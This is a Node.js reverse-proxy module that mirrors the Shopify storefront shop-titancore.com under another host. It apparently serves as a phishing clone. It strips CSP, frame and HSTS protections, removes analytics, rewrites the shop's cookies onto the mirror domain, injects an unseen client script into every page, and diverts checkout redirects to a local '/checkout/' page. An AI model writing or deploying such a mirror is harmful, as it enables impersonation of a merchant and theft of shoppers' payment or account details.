import { createProxyMiddleware } from 'http-proxy-middleware';
import fs from 'fs';
import https from 'https';
import zlib from 'zlib';

const TARGET = process.env.TARGET_URL || 'https://shop-titancore.com';
const TARGET_ORIGIN = TARGET.replace(/\/$/, '');
const TARGET_HOST = new URL(TARGET).host;
const WWW_TARGET = (process.env.WWW_TARGET_URL || 'https://www.shop-titancore.com').replace(/\/$/, '');
const WWW_TARGET_HOST = new URL(WWW_TARGET).host;
const PUBLIC_HOST = process.env.PUBLIC_HOST || '';
const PASSTHROUGH = process.env.CHECKOUT_PASSTHROUGH === '1' || process.env.CHECKOUT_PASSTHROUGH === 'true';
/** Advertorial stack on www.shop-titancore.com (bare domain returns 404) */
const WWW_ONLY_PATH_RES = [
  /^\/tpmn(?:\/|$)/i,
  /^\/core\.min\.(?:js|css)$/i,
  /^\/public(?:\/|$)/i,
];

const MAX_SOCKETS = parseInt(process.env.MAX_SOCKETS || '32', 10);
const TIMEOUT_MS = parseInt(process.env.UPSTREAM_TIMEOUT || '120000', 10);

const agent = new https.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });

const TITANCORE_HOST_RE = /^(?:www\.)?shop-titancore\.com$/i;
const TITANCORE_DOMAIN_RE = /(?:https?:)?\/\/(?:www\.)?shop-titancore\.com/gi;
const STATIC_RE = /\.(js|mjs|css|woff2?|ttf|otf|eot|png|jpe?g|gif|svg|ico|webp|avif|map)(\?|$)/i;

const CLIENT_INJECT = fs.readFileSync(new URL('./inject.js', import.meta.url), 'utf8')
  .replace(/<\/script/gi, '<\\/script');

const HOP_BY_HOP = new Set([
  'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
  'te', 'trailer', 'transfer-encoding', 'upgrade',
]);

function pathOnly(url) {
  return String(url || '').split('?')[0].split('#')[0];
}

function isWwwOnlyPath(url) {
  const p = pathOnly(url);
  return WWW_ONLY_PATH_RES.some((re) => re.test(p));
}

function resolveUpstream(url) {
  return isWwwOnlyPath(url) ? WWW_TARGET : TARGET_ORIGIN;
}

function resolveUpstreamHost(url) {
  return isWwwOnlyPath(url) ? WWW_TARGET_HOST : TARGET_HOST;
}

function isCheckoutPath(path) {
  return /^\/checkouts(?:\/|$)/i.test(pathOnly(path));
}

function isCheckoutRedirectUrl(value) {
  const v = String(value || '');
  if (/checkout\.shopify\.com/i.test(v)) return true;
  if (/shop\.app\/checkout/i.test(v)) return true;
  try {
    const u = new URL(v, TARGET_ORIGIN);
    if (/checkout\.shopify\.com/i.test(u.host)) return true;
    if (/shop\.app/i.test(u.host) && /checkout/i.test(u.pathname)) return true;
    if (TITANCORE_HOST_RE.test(u.host) && /^\/checkout(?:\/|\?|$)/i.test(u.pathname)) return true;
    if (TITANCORE_HOST_RE.test(u.host) && /^\/checkouts(?:\/|\?|$)/i.test(u.pathname)) return true;
  } catch {}
  return /^\/checkout(?:\/|\?|$)/i.test(v) || /^\/checkouts(?:\/|\?|$)/i.test(v);
}

function rewriteLocation(location, mirrorHost) {
  const value = String(location || '');
  if (!PASSTHROUGH && isCheckoutRedirectUrl(value)) return '/checkout/';

  try {
    const u = new URL(value, TARGET_ORIGIN);
    if (/shop\.app/i.test(u.host)) {
      const back = u.searchParams.get('ur_back_url') || u.searchParams.get('redirect_uri');
      if (back) {
        try {
          const backUrl = new URL(back);
          if (TITANCORE_HOST_RE.test(backUrl.host)) {
            const rel = `${backUrl.pathname}${backUrl.search}${backUrl.hash}` || '/';
            if (PASSTHROUGH) return rel;
            return '/checkout/';
          }
        } catch {}
      }
      if (!PASSTHROUGH) return '/checkout/';
    }
    if (TITANCORE_HOST_RE.test(u.host)) {
      return `${u.pathname}${u.search}${u.hash}` || '/';
    }
  } catch {}

  let out = value.replace(TITANCORE_DOMAIN_RE, '');
  if (mirrorHost) {
    out = out.replace(new RegExp(`https?://${mirrorHost.replace(/\./g, '\\.')}`, 'gi'), '');
  }
  return out || '/';
}

function rewriteBodyUrls(text, mirrorHost) {
  if (!text) return text;
  let out = text.replace(TITANCORE_DOMAIN_RE, '');
  if (mirrorHost) {
    out = out.replace(new RegExp(`https?://${mirrorHost.replace(/\./g, '\\.')}`, 'gi'), '');
    out = out.replace(new RegExp(`//${mirrorHost.replace(/\./g, '\\.')}`, 'gi'), '');
  }
  return out;
}

function rewriteSetCookies(headers, mirrorHost) {
  const raw = headers['set-cookie'];
  if (!raw) return headers;
  const list = Array.isArray(raw) ? raw : [raw];
  const rewritten = list.map((cookie) => {
    let c = cookie
      .replace(/;\s*domain=[^;]*/gi, '')
      .replace(/;\s*Domain=[^;]*/gi, '');
    if (mirrorHost && /shop-titancore\.com/i.test(c)) {
      c = c.replace(/shop-titancore\.com/gi, mirrorHost);
    }
    return c;
  });
  return { ...headers, 'set-cookie': rewritten };
}

function rewriteStaticHtmlUrls(html) {
  const origin = TARGET_ORIGIN;

  function originCdn(path) {
    if (!path || !/^\/cdn\/(?:shop|shopifycloud)\//i.test(path)) return path;
    return `${origin}${path}`;
  }

  html = html.replace(
    /(<script\b[^>]*\bsrc=["'])((?:https?:)?\/\/(?:www\.)?shop-titancore\.com)?(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, _host, path, post) => `${pre}${originCdn(path)}${post}`,
  );
  html = html.replace(
    /(<script\b[^>]*\bsrc=["'])(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, path, post) => `${pre}${originCdn(path)}${post}`,
  );

  html = html.replace(
    /(<link\b[^>]*\bhref=["'])((?:https?:)?\/\/(?:www\.)?shop-titancore\.com)?(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, _host, path, post) => `${pre}${originCdn(path)}${post}`,
  );
  html = html.replace(
    /(<link\b[^>]*\bhref=["'])(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, path, post) => `${pre}${originCdn(path)}${post}`,
  );

  html = html.replace(
    /(import\s*\(\s*["'])(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["']\s*\))/gi,
    (_, pre, path, post) => `${pre}${originCdn(path)}${post}`,
  );

  html = html.replace(
    /(<img\b[^>]*\bsrc=["'])((?:https?:)?\/\/(?:www\.)?shop-titancore\.com)?(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, _host, path, post) => `${pre}${originCdn(path)}${post}`,
  );
  html = html.replace(
    /(<img\b[^>]*\bsrc=["'])(\/cdn\/(?:shop|shopifycloud)\/[^"']+)(["'])/gi,
    (_, pre, path, post) => `${pre}${originCdn(path)}${post}`,
  );

  html = html.replace(/(\bsrcset=["'])([^"']+)(["'])/gi, (_, pre, value, post) => {
    const rewritten = value.split(',').map((part) => {
      const p = part.trim();
      const abs = p.match(/^((?:https?:)?\/\/(?:www\.)?shop-titancore\.com)(\/cdn\/(?:shop|shopifycloud)\/\S+)/);
      if (abs) {
        const rest = p.slice(abs[1].length + abs[2].length).trim();
        return `${originCdn(abs[2])}${rest ? ` ${rest}` : ''}`;
      }
      if (/^\/cdn\/(?:shop|shopifycloud)\//i.test(p)) {
        const pieces = p.split(/\s+/);
        pieces[0] = originCdn(pieces[0]);
        return pieces.join(' ');
      }
      return p;
    }).join(', ');
    return `${pre}${rewritten}${post}`;
  });

  if (!PASSTHROUGH) {
    html = html.replace(/<script[^>]*\/checkouts\/internal\/preloads\.js[^>]*><\/script>/gi, '');
  }
  return html;
}

function patchBrokenVclidScript(html) {
  return html.replace(
    /(<link[^>]*theme\.css[^>]*\/><script>\s*\(function\(\)\{[\s\S]*?SameSite=Lax';\s*\}\s*)<\/script>/gi,
    '$1})();</script>',
  );
}

function patchStorefrontHtml(html) {
  html = rewriteStaticHtmlUrls(html);
  html = html.replace(/(?:https?:)?\/\/(?:www\.)?shop-titancore\.com(?!\/cdn\/)/gi, '');
  html = html.replace(
    /Shopify\.cdnHost\s*=\s*"shop-titancore\.com\/cdn"/gi,
    'Shopify.cdnHost = location.host + "/cdn"',
  );
  html = patchBrokenVclidScript(html);
  html = html.replace(/<script[^>]*(googletagmanager|google-analytics|gtag|facebook\.net|hotjar|clarity|monorail|trekkie)[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<link[^>]*manifest["'][^>]*>/gi, '');

  const headPatch = `<base href="/"><script>${CLIENT_INJECT}</script>`;
  if (/<head[^>]*>/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, (m) => `${m}${headPatch}`);
  } else {
    html = headPatch + html;
  }
  return html;
}

function patchCheckoutPassthroughHtml(html, mirrorHost) {
  html = rewriteBodyUrls(html, mirrorHost);
  if (/<head[^>]*>/i.test(html) && !/<base\s/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, (m) => `${m}<base href="/">`);
  }
  return html;
}

function shouldRewriteHtml(req, ct) {
  if (!ct.includes('text/html')) return false;
  const path = String(req.originalUrl || req.url || '').split('?')[0];
  if (STATIC_RE.test(path)) return false;
  return true;
}

function cleanResponseHeaders(headers) {
  const h = { ...headers };
  for (const k of Object.keys(h)) {
    if (HOP_BY_HOP.has(k.toLowerCase())) delete h[k];
  }
  delete h['content-security-policy'];
  delete h['content-security-policy-report-only'];
  delete h['x-frame-options'];
  delete h['x-content-type-options'];
  delete h['strict-transport-security'];
  delete h['content-length'];
  return h;
}

function decodeBody(buffer, encoding) {
  if (!encoding) return buffer;
  try {
    if (String(encoding).includes('br')) return zlib.brotliDecompressSync(buffer);
    if (String(encoding).includes('gzip')) return zlib.gunzipSync(buffer);
    if (String(encoding).includes('deflate')) return zlib.inflateSync(buffer);
  } catch {}
  return buffer;
}

export function createTitancoreProxy() {
  return createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    router(req) {
      return resolveUpstream(req.originalUrl || req.url);
    },
    agent,
    timeout: TIMEOUT_MS,
    proxyTimeout: TIMEOUT_MS,
    followRedirects: false,
    selfHandleResponse: true,
    on: {
      proxyReq(proxyReq, req) {
        const upstream = resolveUpstream(req.originalUrl || req.url);
        const upstreamHost = resolveUpstreamHost(req.originalUrl || req.url);
        proxyReq.setHeader('host', upstreamHost);
        proxyReq.setHeader('origin', upstream);
        proxyReq.setHeader('referer', `${upstream}/`);
      },
      proxyRes(proxyRes, req, res) {
        const status = proxyRes.statusCode || 502;
        const location = proxyRes.headers.location;
        const mirrorHost = req.headers.host || PUBLIC_HOST || '';
        const reqPath = String(req.originalUrl || req.url || '').split('?')[0];

        if (location && status >= 300 && status < 400) {
          const rewritten = rewriteLocation(location, mirrorHost);
          if (rewritten !== location) {
            if (!res.headersSent) {
              const h = cleanResponseHeaders(proxyRes.headers);
              h.location = rewritten;
              h['cache-control'] = 'no-store';
              res.writeHead(status, h);
              res.end();
            }
            return;
          }
        }

        const ct = String(proxyRes.headers['content-type'] || '');
        const chunks = [];

        proxyRes.on('data', (c) => chunks.push(c));
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          let body = Buffer.concat(chunks);
          const encoding = proxyRes.headers['content-encoding'];
          body = decodeBody(body, encoding);

          let headers = cleanResponseHeaders(proxyRes.headers);
          headers = rewriteSetCookies(headers, mirrorHost);

          if (shouldRewriteHtml(req, ct)) {
            let html = body.toString('utf8');
            if (PASSTHROUGH && isCheckoutPath(reqPath)) {
              html = patchCheckoutPassthroughHtml(html, mirrorHost);
            } else {
              html = patchStorefrontHtml(html);
            }
            body = Buffer.from(html, 'utf8');
            delete headers['content-encoding'];
            headers['content-type'] = 'text/html; charset=utf-8';
            headers['content-length'] = String(body.length);
            headers['cache-control'] = 'no-cache';
            res.writeHead(status, headers);
            res.end(body);
            return;
          }

          if (PASSTHROUGH && ct.includes('json') && TITANCORE_DOMAIN_RE.test(body.toString('utf8'))) {
            body = Buffer.from(rewriteBodyUrls(body.toString('utf8'), mirrorHost), 'utf8');
          }

          if (encoding) delete headers['content-encoding'];
          if (STATIC_RE.test(reqPath)) {
            headers['cache-control'] = 'public, max-age=1800';
          }
          headers['content-length'] = String(body.length);
          res.writeHead(status, headers);
          res.end(body);
        });
        proxyRes.on('error', () => {
          if (!res.headersSent) {
            res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' });
            res.end('upstream error');
          }
        });
      },
      error(err, req, res) {
        if (!res.headersSent) {
          res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' });
          res.end(`proxy error: ${err.message}`);
        }
      },
    },
  });
}

export {
  PASSTHROUGH,
  isCheckoutPath,
  isCheckoutRedirectUrl,
  isWwwOnlyPath,
  resolveUpstream,
  rewriteLocation,
  patchStorefrontHtml,
  rewriteStaticHtmlUrls,
};
